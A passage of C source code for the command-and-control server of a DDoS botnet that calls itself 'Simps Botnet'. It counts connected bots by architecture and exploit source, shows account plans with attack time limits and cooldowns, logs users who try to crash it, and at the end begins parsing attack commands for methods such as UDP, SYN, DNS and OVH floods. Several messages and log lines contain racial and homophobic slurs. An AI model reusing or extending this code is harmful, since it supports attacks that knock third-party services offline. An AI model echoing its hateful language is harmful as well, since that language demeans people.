						sprintf(SimpsarchARM, "\e[37marchARM\e[38;5;196m:\e[37m %d\r\n", archARMConnected());

						if (send(datafd, SimpsarchARM, strlen(SimpsarchARM), MSG_NOSIGNAL) == -1)
							goto end;
						memset(SimpsarchARM, 0, sizeof(SimpsarchARM));
					}
					if (xDLSConnected() != 0)
					{
						char SimpsxDLS[5000];

						sprintf(SimpsxDLS, "\e[37mxDLS\e[38;5;196m:\e[37m %d\r\n", xDLSConnected());

						if (send(datafd, SimpsxDLS, strlen(SimpsxDLS), MSG_NOSIGNAL) == -1)
							goto end;
						memset(SimpsxDLS, 0, sizeof(SimpsxDLS));
					}
					if (yarnConnected() != 0)
					{
						char Simpsyarn[5000];

						sprintf(Simpsyarn, "\e[37myarn\e[38;5;196m:\e[37m %d\r\n", yarnConnected());

						if (send(datafd, Simpsyarn, strlen(Simpsyarn), MSG_NOSIGNAL) == -1)
							goto end;
						memset(Simpsyarn, 0, sizeof(Simpsyarn));
					}
					if (ThinkPHPConnected() != 0)
					{
						char SimpsThinkPHP[5000];

						sprintf(SimpsThinkPHP, "\e[37mThinkPHP\e[38;5;196m:\e[37m %d\r\n", ThinkPHPConnected());

						if (send(datafd, SimpsThinkPHP, strlen(SimpsThinkPHP), MSG_NOSIGNAL) == -1)
							goto end;
						memset(SimpsThinkPHP, 0, sizeof(SimpsThinkPHP));
					}
					if (unknownConnected() != 0)
					{
						char Simpsunknown[5000];

						sprintf(Simpsunknown, "\e[37munknown\e[38;5;196m:\e[37m %d\r\n", unknownConnected());

						if (send(datafd, Simpsunknown, strlen(Simpsunknown), MSG_NOSIGNAL) == -1)
							goto end;
						memset(Simpsunknown, 0, sizeof(Simpsunknown));
					}
					char total[512];

					sprintf(total, "\e[37mtotal\e[38;5;196m: \e[37m%d\r\n", BotsConnected());

					if (send(datafd, total, strlen(total), MSG_NOSIGNAL) == -1)
						goto end;
					memset(total, 0, sizeof(total));
				}
				else
				{
					sprintf(botnet, "\e[37mOnly Admins Can See Bots.\r\n");
					if (send(datafd, "\e[2J\e[3J\e[H", 12, MSG_NOSIGNAL) == -1)
						goto end;
					if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
						goto end;
					memset(botnet, 0, sizeof(botnet));
				}
			}
		}

		/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

		if (strcasestr(buf, "OWNERS"))
		{
			sprintf(Title[datafd].string, accounts[find_line].expiry);
			Title[datafd].login = 38;
			char owners0[5000];
			char owners1[5000];
			char owners2[5000];
			char owners3[5000];
			char owners4[5000];
			char owners6[5000];
			char owners7[5000];

			sprintf(owners0, "\e[31m        ╔═════════\e[95m═════════╗ \r\n");
			sprintf(owners1, "\e[31m        ║ [+] .Own\e[95mers. [+] ║ \r\n");
			sprintf(owners2, "\e[31m╔═══════╩═════════\e[95m═════════╩═══════╗ \r\n");
			sprintf(owners3, "\e[31m║ Simps Botnet Own\e[95mers And Admins.  ║ \r\n");
			sprintf(owners4, "\e[31m║ Owner: UR0A: ig:\e[95m @ur0a_          ║ \r\n");
			sprintf(owners6, "\e[31m║ Admin: Mxlusio: \e[95mig: @mxlusio     ║ \r\n");
			sprintf(owners7, "\e[31m╚═════════════════\e[95m═════════════════╝ \r\n");

			if (send(datafd, "\e[2J\e[3J\e[H", 12, MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, owners0, strlen(owners0), MSG_NOSIGNAL) == -1)
				goto end;
			memset(owners0, 0, sizeof(owners0));
			if (send(datafd, owners1, strlen(owners1), MSG_NOSIGNAL) == -1)
				goto end;
			memset(owners1, 0, sizeof(owners1));
			if (send(datafd, owners2, strlen(owners2), MSG_NOSIGNAL) == -1)
				goto end;
			memset(owners2, 0, sizeof(owners2));
			if (send(datafd, owners3, strlen(owners3), MSG_NOSIGNAL) == -1)
				goto end;
			memset(owners3, 0, sizeof(owners3));
			if (send(datafd, owners4, strlen(owners4), MSG_NOSIGNAL) == -1)
				goto end;
			memset(owners4, 0, sizeof(owners4));
			if (send(datafd, owners6, strlen(owners6), MSG_NOSIGNAL) == -1)
				goto end;
			memset(owners6, 0, sizeof(owners6));
			if (send(datafd, owners7, strlen(owners7), MSG_NOSIGNAL) == -1)
				goto end;
			memset(owners7, 0, sizeof(owners7));
		}

		/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

		if (strcasestr(buf, "CTYPES"))
		{
			sprintf(Title[datafd].string, accounts[find_line].expiry);
			Title[datafd].login = 41;
			char clears0[5000];
			char clears1[5000];
			char clears2[5000];
			char clears3[5000];
			char clears4[5000];
			char clears5[5000];
			char clears6[5000];

			sprintf(clears0, "\e[31m        ╔═════════\e[95m═════════╗ \r\n");
			sprintf(clears1, "\e[31m        ║ [+] .Cle\e[95mars. [+] ║ \r\n");
			sprintf(clears2, "\e[31m╔═══════╩═════════\e[95m═════════╩═══════╗ \r\n");
			sprintf(clears3, "\e[31m║ Clear \e[95m>\e[31m Shows \e[95mHome Screen        ║ \r\n");
			sprintf(clears4, "\e[31m║ Cls   \e[95m>\e[31m Shows \e[95mCls Screen         ║ \r\n");
			sprintf(clears5, "\e[31m║ Wipe  \e[95m>\e[31m Shows \e[95mBlank Screen       ║ \r\n");
			sprintf(clears6, "\e[31m╚═════════════════\e[95m═════════════════╝ \r\n");

			if (send(datafd, "\e[2J\e[3J\e[H", 12, MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, clears0, strlen(clears0), MSG_NOSIGNAL) == -1)
				goto end;
			memset(clears0, 0, sizeof(clears0));
			if (send(datafd, clears1, strlen(clears1), MSG_NOSIGNAL) == -1)
				goto end;
			memset(clears1, 0, sizeof(clears1));
			if (send(datafd, clears2, strlen(clears2), MSG_NOSIGNAL) == -1)
				goto end;
			memset(clears2, 0, sizeof(clears2));
			if (send(datafd, clears3, strlen(clears3), MSG_NOSIGNAL) == -1)
				goto end;
			memset(clears3, 0, sizeof(clears3));
			if (send(datafd, clears4, strlen(clears4), MSG_NOSIGNAL) == -1)
				goto end;
			memset(clears4, 0, sizeof(clears4));
			if (send(datafd, clears5, strlen(clears5), MSG_NOSIGNAL) == -1)
				goto end;
			memset(clears5, 0, sizeof(clears5));
			if (send(datafd, clears6, strlen(clears6), MSG_NOSIGNAL) == -1)
				goto end;
			memset(clears6, 0, sizeof(clears6));
		}

		/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

		if (strcasestr(buf, "WIPE"))
		{
			sprintf(Title[datafd].string, accounts[find_line].expiry);
			Title[datafd].login = 39;

			if (send(datafd, "\e[2J\e[3J\e[H", 12, MSG_NOSIGNAL) == -1)
				goto end;
		}

		/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

		if (strcasestr(buf, "CLS"))
		{
			sprintf(Title[datafd].string, accounts[find_line].expiry);
			Title[datafd].login = 40;
			char basicbanner[5000];

			sprintf(basicbanner, "\e[37mПривет, друг \r\n");

			if (send(datafd, "\e[2J\e[3J\e[H", 12, MSG_NOSIGNAL) == -1)
				goto end;
			if (motdlol != 0)
			{
				if (strlen(motd) > 1)
				{
					sprintf(niggas, "\e[37mMOTD\e[31m:\e[37m %s\r\n", motd);
					if (send(datafd, niggas, strlen(niggas), MSG_NOSIGNAL) == -1)
						goto end;
					memset(niggas, 0, sizeof(niggas));
				}
			}
			if (send(datafd, basicbanner, strlen(basicbanner), MSG_NOSIGNAL) == -1)
				goto end;
			memset(basicbanner, 0, sizeof(basicbanner));
		}

		/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

		if (strcasestr(buf, "!") || strcasestr(buf, "@") || strcasestr(buf, "#") || strcasestr(buf, "$") || strcasestr(buf, "^") || strcasestr(buf, "&") || strcasestr(buf, "*") || strcasestr(buf, "(") || strcasestr(buf, ")") || strcasestr(buf, "-") || strcasestr(buf, "_") || strcasestr(buf, "=") || strcasestr(buf, "+"))
		{
			sprintf(Title[datafd].string, accounts[find_line].expiry);
			Title[datafd].login = 33;
			char crashlol0[5000];

			sprintf(crashlol0, "\e[37mSimps On Top\e[31m.\e[37m (CNC Crash Attempt Was Logged) \r\n");

			if (send(datafd, "\e[2J\e[3J\e[H", 12, MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, crashlol0, strlen(crashlol0), MSG_NOSIGNAL) == -1)
				goto end;
			memset(crashlol0, 0, sizeof(crashlol0));
			FILE *LogFile;
			LogFile = fopen("Crash.log", "a");
			fprintf(LogFile, "%s: Has Tried To Symbol-Crash The CNC\r\n", accounts[find_line].username);
			fclose(LogFile);
			memset(botnet, 0, sizeof(botnet));
			sleep(2);
			memset(buf, 0, sizeof(buf));
			close(datafd);
		}

		/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

		if (strcasestr(buf, "PKILL"))
		{
			sprintf(Title[datafd].string, accounts[find_line].expiry);
			Title[datafd].login = 42;
			char pkill0[5000];

			sprintf(pkill0, "\e[37mSimps On Top\e[31m.\e[37m (CNC Crash Attempt Was Logged) \r\n");

			if (send(datafd, "\e[2J\e[3J\e[H", 12, MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, pkill0, strlen(pkill0), MSG_NOSIGNAL) == -1)
				goto end;
			memset(pkill0, 0, sizeof(pkill0));
			FILE *LogFile;
			LogFile = fopen("Crash.log", "a");
			fprintf(LogFile, "%s: Has Tried To Pkill The CNC\r\n", accounts[find_line].username);
			fclose(LogFile);
			memset(botnet, 0, sizeof(botnet));
			sleep(2);
			memset(buf, 0, sizeof(buf));
			close(datafd);
		}

		/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

		if (strcasestr(buf, "CLEAR"))
		{
			sprintf(Title[datafd].string, accounts[find_line].expiry);
			Title[datafd].login = 2;
			if (send(datafd, "\e[2J\e[3J\e[H", 12, MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, bannerspace1, strlen(bannerspace1), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners1a, strlen(probanners1a), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners2a, strlen(probanners2a), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners3a, strlen(probanners3a), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners4a, strlen(probanners4a), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners5a, strlen(probanners5a), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners6a, strlen(probanners6a), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners7a, strlen(probanners7a), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners8a, strlen(probanners8a), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners9a, strlen(probanners9a), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners1b, strlen(probanners1b), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners2b, strlen(probanners2b), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners3b, strlen(probanners3b), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners4b, strlen(probanners4b), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners5b, strlen(probanners5b), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners6b, strlen(probanners6b), MSG_NOSIGNAL) == -1)
				goto end;
			usleep(250000);
			if (send(datafd, "\e[2J\e[3J\e[H", 12, MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, bannerspace2, strlen(bannerspace2), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners7b, strlen(probanners7b), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners8b, strlen(probanners8b), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners9b, strlen(probanners9b), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners1c, strlen(probanners1c), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners2c, strlen(probanners2c), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners3c, strlen(probanners3c), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners4c, strlen(probanners4c), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners5c, strlen(probanners5c), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners6c, strlen(probanners6c), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners7c, strlen(probanners7c), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners8c, strlen(probanners8c), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners9c, strlen(probanners9c), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners1d, strlen(probanners1d), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners2d, strlen(probanners2d), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners3d, strlen(probanners3d), MSG_NOSIGNAL) == -1)
				goto end;
			usleep(250000);
			if (send(datafd, "\e[2J\e[3J\e[H", 12, MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, bannerspace3, strlen(bannerspace3), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners4d, strlen(probanners4d), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners5d, strlen(probanners5d), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners6d, strlen(probanners6d), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners7d, strlen(probanners7d), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners8d, strlen(probanners8d), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners9d, strlen(probanners9d), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners1e, strlen(probanners1e), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners2e, strlen(probanners2e), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners3e, strlen(probanners3e), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners4e, strlen(probanners4e), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners5e, strlen(probanners5e), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners6e, strlen(probanners6e), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners7e, strlen(probanners7e), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners8e, strlen(probanners8e), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners9e, strlen(probanners9e), MSG_NOSIGNAL) == -1)
				goto end;
			usleep(250000);
			if (send(datafd, "\e[2J\e[3J\e[H", 12, MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, bannerspace4, strlen(bannerspace4), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners1f, strlen(probanners1f), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners2f, strlen(probanners2f), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners3f, strlen(probanners3f), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners4f, strlen(probanners4f), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners5f, strlen(probanners5f), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners6f, strlen(probanners6f), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners7f, strlen(probanners7f), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners8f, strlen(probanners8f), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners9f, strlen(probanners9f), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners1g, strlen(probanners1g), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners2g, strlen(probanners2g), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners3g, strlen(probanners3g), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners4g, strlen(probanners4g), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners5g, strlen(probanners5g), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners6g, strlen(probanners6g), MSG_NOSIGNAL) == -1)
				goto end;
			usleep(250000);
			if (send(datafd, "\e[2J\e[3J\e[H", 12, MSG_NOSIGNAL) == -1)
				goto end;
			if (motdlol != 0)
			{
				if (strlen(motd) > 1)
				{
					sprintf(niggas, "\e[37mMOTD\e[31m:\e[37m %s\r\n", motd);
					if (send(datafd, niggas, strlen(niggas), MSG_NOSIGNAL) == -1)
						goto end;
					memset(niggas, 0, sizeof(niggas));
				}
			}
			if (send(datafd, bannerspace5, strlen(bannerspace5), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners1, strlen(probanners1), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners2, strlen(probanners2), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners3, strlen(probanners3), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners4, strlen(probanners4), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners5, strlen(probanners5), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners6, strlen(probanners6), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners7, strlen(probanners7), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners8, strlen(probanners8), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probanners9, strlen(probanners9), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probannersa, strlen(probannersa), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probannersb, strlen(probannersb), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probannersc, strlen(probannersc), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probannersd, strlen(probannersd), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probannerse, strlen(probannerse), MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, probannersf, strlen(probannersf), MSG_NOSIGNAL) == -1)
				goto end;
		}

		/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

		if (strlen(buf) > 50)
		{
			sprintf(Title[datafd].string, accounts[find_line].expiry);
			Title[datafd].login = 33;
			sprintf(botnet, "\e[37mStop Trying To Crash The CNC Nigger\e[31m.\e[37m (CNC Crash Attempt Was Logged)");
			if (send(datafd, "\e[2J\e[3J\e[H", 12, MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
				goto end;
			FILE *LogFile;
			LogFile = fopen("Crash.log", "a");
			fprintf(LogFile, "%s: Has Tried To Crash The CNC\r\n", accounts[find_line].username);
			fclose(LogFile);
			memset(botnet, 0, sizeof(botnet));
			sleep(2);
			memset(buf, 0, sizeof(buf));
			close(datafd);
		}

		/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

		if (strcasestr(buf, "GAY"))
		{
			sprintf(Title[datafd].string, accounts[find_line].expiry);
			Title[datafd].login = 32;
			char Titlefaggot[5000];

			sprintf(Titlefaggot, "\e[37mYour A gay Faggot Im Banning You If Your Gay\e[31m.\r\n");

			if (send(datafd, "\e[2J\e[3J\e[H", 12, MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, Titlefaggot, strlen(Titlefaggot), MSG_NOSIGNAL) == -1)
				goto end;
			FILE *LogFile;
			LogFile = fopen("Server.log", "a");
			fprintf(LogFile, "%s: Is A Gay Fag.\r\n", accounts[find_line].username);
			fclose(LogFile);
			memset(Titlefaggot, 0, sizeof(Titlefaggot));
		}

		/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

		if (strcasestr(buf, "UR0A"))
		{
			sprintf(Title[datafd].string, accounts[find_line].expiry);
			Title[datafd].login = 34;
			char UR0Afaggot[5000];

			sprintf(UR0Afaggot, "\e[37mHello\e[31m.\r\n");

			if (send(datafd, "\e[2J\e[3J\e[H", 12, MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, UR0Afaggot, strlen(UR0Afaggot), MSG_NOSIGNAL) == -1)
				goto end;
			memset(UR0Afaggot, 0, sizeof(UR0Afaggot));
		}

		/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

		if (strcasestr(buf, "DAD"))
		{
			sprintf(Title[datafd].string, accounts[find_line].expiry);
			Title[datafd].login = 52;
			char dadfaggot[5000];

			sprintf(dadfaggot, "\e[37mIm Your Daddy\e[31m.\r\n");

			if (send(datafd, "\e[2J\e[3J\e[H", 12, MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, dadfaggot, strlen(dadfaggot), MSG_NOSIGNAL) == -1)
				goto end;
			memset(dadfaggot, 0, sizeof(dadfaggot));
		}

		/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

		if (strcasestr(buf, "BANNERS"))
		{
			sprintf(Title[datafd].string, accounts[find_line].expiry);
			Title[datafd].login = 60;
			sprintf(botnet, "\e[37mSimps Does Not Have Banners\e[31m.\r\n");
			if (send(datafd, "\e[2J\e[3J\e[H", 12, MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
				goto end;
			memset(botnet, 0, sizeof(botnet));
		}

		/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

		if (strcasestr(buf, "LOGOUT"))
		{
			sprintf(Title[datafd].string, accounts[find_line].expiry);
			Title[datafd].login = 13;
			char logoutmessage0[2048];
			char logoutmessage1[2048];
			char logoutmessage2[2048];
			char logoutmessage3[2048];

			sprintf(logoutmessage0, "\e[31mLogging\e[95m out\r\n");
			sprintf(logoutmessage1, "\e[31mLogging\e[95m out.\r\n");
			sprintf(logoutmessage2, "\e[31mLogging\e[95m out..\r\n");
			sprintf(logoutmessage3, "\e[31mLogging\e[95m out...\r\n");

			if (send(datafd, "\e[2J\e[3J\e[H", 12, MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, logoutmessage0, strlen(logoutmessage0), MSG_NOSIGNAL) == -1)
				goto end;
			memset(logoutmessage0, 0, sizeof(logoutmessage0));
			usleep(750000);
			if (send(datafd, "\e[2J\e[3J\e[H", 12, MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, logoutmessage1, strlen(logoutmessage1), MSG_NOSIGNAL) == -1)
				goto end;
			memset(logoutmessage1, 0, sizeof(logoutmessage1));
			usleep(750000);
			if (send(datafd, "\e[2J\e[3J\e[H", 12, MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, logoutmessage2, strlen(logoutmessage2), MSG_NOSIGNAL) == -1)
				goto end;
			memset(logoutmessage2, 0, sizeof(logoutmessage2));
			usleep(750000);
			if (send(datafd, "\e[2J\e[3J\e[H", 12, MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, logoutmessage3, strlen(logoutmessage3), MSG_NOSIGNAL) == -1)
				goto end;
			memset(logoutmessage3, 0, sizeof(logoutmessage3));
			usleep(1000000);
			goto end;
		}

		/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

		if (strcasestr(buf, "INFO"))
		{
			sprintf(Title[datafd].string, accounts[find_line].expiry);
			Title[datafd].login = 51;
			char info0[5000];
			char info1[5000];
			char info2[5000];
			char info3[5000];
			char info4[5000];
			char info5[5000];
			char info6[5000];

			sprintf(info0, "\e[37mSimps Botnet Account Info\e[31m.\r\n");
			sprintf(info1, "\e[37mUserName\e[31m:\e[37m %s\r\n", accounts[find_line].username);
			sprintf(info2, "\e[37mPassWord\e[31m:\e[37m %s\r\n", accounts[find_line].password);
			sprintf(info3, "\e[37mPlan\e[31m:\e[37m %s\r\n", accounts[find_line].id);
			sprintf(info4, "\e[37mMaxTime\e[31m:\e[37m %d\r\n", accounts[find_line].maxtime);
			sprintf(info5, "\e[37mCoolDown\e[31m:\e[37m %d\r\n", accounts[find_line].cooldown);
			sprintf(info6, "\e[37mExpiry\e[31m:\e[37m %s\r\n", accounts[find_line].expiry);

			if (send(datafd, "\e[2J\e[3J\e[H", 12, MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, info0, strlen(info0), MSG_NOSIGNAL) == -1)
				goto end;
			memset(info0, 0, sizeof(info0));
			if (send(datafd, info1, strlen(info1), MSG_NOSIGNAL) == -1)
				goto end;
			memset(info1, 0, sizeof(info1));
			if (send(datafd, info2, strlen(info2), MSG_NOSIGNAL) == -1)
				goto end;
			memset(info2, 0, sizeof(info2));
			if (send(datafd, info3, strlen(info3), MSG_NOSIGNAL) == -1)
				goto end;
			memset(info3, 0, sizeof(info3));
			if (send(datafd, info4, strlen(info4), MSG_NOSIGNAL) == -1)
				goto end;
			memset(info4, 0, sizeof(info4));
			if (send(datafd, info5, strlen(info5), MSG_NOSIGNAL) == -1)
				goto end;
			memset(info5, 0, sizeof(info5));
			if (send(datafd, info6, strlen(info6), MSG_NOSIGNAL) == -1)
				goto end;
			memset(info6, 0, sizeof(info6));
		}

		/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

		if (strcasestr(buf, "MDOFF"))
		{
			if (strcmp(admin, accounts[find_line].id) == 0)
			{
				sprintf(Title[datafd].string, accounts[find_line].expiry);
				Title[datafd].login = 59;
				if (motdlol != 0)
				{
					motdlol = 0;
					sprintf(botnet, "\e[37mMotd Has Been Turned Off\e[31m.\r\n");
					if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
						goto end;
					memset(botnet, 0, sizeof(botnet));
					FILE *LogFile;
					LogFile = fopen("Admin.log", "a");
					fprintf(LogFile, "%s: Has Turned Off Motd\e[31m.\r\n", accounts[find_line].username);
					fclose(LogFile);
				}
				else
				{
					sprintf(botnet, "\e[37mMotd Has Already Been Turned Off\e[31m.\r\n");
					if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
						goto end;
					memset(botnet, 0, sizeof(botnet));
				}
			}
			else
			{
				FILE *LogFile;
				LogFile = fopen("Server.log", "a");
				fprintf(LogFile, "%s: Has Tried To Change The Motd!\r\n", accounts[find_line].username);
				fclose(LogFile);
				sprintf(botnet, "\e[37mOnly Admins Can Turn The Motd Off\e[31m!\r\n");
				if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
					goto end;
				memset(botnet, 0, sizeof(botnet));
			}
		}

		/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

		if (strcasestr(buf, "MOTD"))
		{
			if (strcmp(admin, accounts[find_line].id) == 0)
			{
				sprintf(Title[datafd].string, accounts[find_line].expiry);
				Title[datafd].login = 58;
				sprintf(botnet, "\e[37mMotd\e[31m:\e[37m ");
				if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
					goto end;
				memset(botnet, 0, sizeof(botnet));
				memset(buf, 0, sizeof(buf));
				if (fdgets(buf, sizeof(buf), datafd) < 1)
					goto end;
				trim(buf);
				if (strlen(buf) > 80 || strlen(buf) < 1)
				{
					sprintf(botnet, "\e[37mInvalid Motd\e[31m!\r\n");
					if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
						goto end;
					memset(botnet, 0, sizeof(botnet));
					goto WhileEnd;
				}
				strcpy(motd, buf);
				FILE *LogFile;
				LogFile = fopen("Admin.log", "a");
				fprintf(LogFile, "%s: Has Changed The Motd.\r\n", accounts[find_line].username);
				fclose(LogFile);
				motdlol++;
				sprintf(botnet, "\e[37mMotd Has Been Successfully Updated\e[31m.\r\n");
				if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
					goto end;
				memset(botnet, 0, sizeof(botnet));
			}
			else
			{
				FILE *LogFile;
				LogFile = fopen("Server.log", "a");
				fprintf(LogFile, "%s: Has Tried To Change The Motd!\r\n", accounts[find_line].username);
				fclose(LogFile);
				sprintf(botnet, "\e[37mOnly Admins Can Update The Motd\e[31m!\r\n");
				if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
					goto end;
				memset(botnet, 0, sizeof(botnet));
			}
		}

		/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

		else if (strcasestr(buf, ".") && strlen(buf) < 55)
		{
			sprintf(Title[datafd].string, accounts[find_line].expiry);
			if (ToggleAttacks == 0)
			{
				if (BotsConnected() != 0)
				{
					if (managements[datafd].CoolDownStatus == 0)
					{
						char newbuf[2048];
						strcpy(newbuf, buf);
						trim(newbuf);
						int argc = 0;
						unsigned char *arg[10 + 1] = {0};
						char *token = strtok(newbuf, " ");
						while (token != 0 && argc < 10)
						{
							arg[argc++] = malloc(strlen(token) + 1);
							strcpy(arg[argc - 1], token);
							token = strtok(0, " ");
						}
						if (argc < 5)
						{
							sprintf(botnet, "\e[37mYou Typed It Wrong\e[31m!\r\n");
							if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
								goto end;
							memset(botnet, 0, sizeof(botnet));
							goto WhileEnd;
						}
						if (!strcasecmp(arg[1], "OVH") ||
							!strcasecmp(arg[1], "STD") ||
							!strcasecmp(arg[1], "UDP") ||
							!strcasecmp(arg[1], "DNS") ||
							!strcasecmp(arg[1], "VSE") ||
							!strcasecmp(arg[1], "SYN") ||
							!strcasecmp(arg[1], "RST") ||
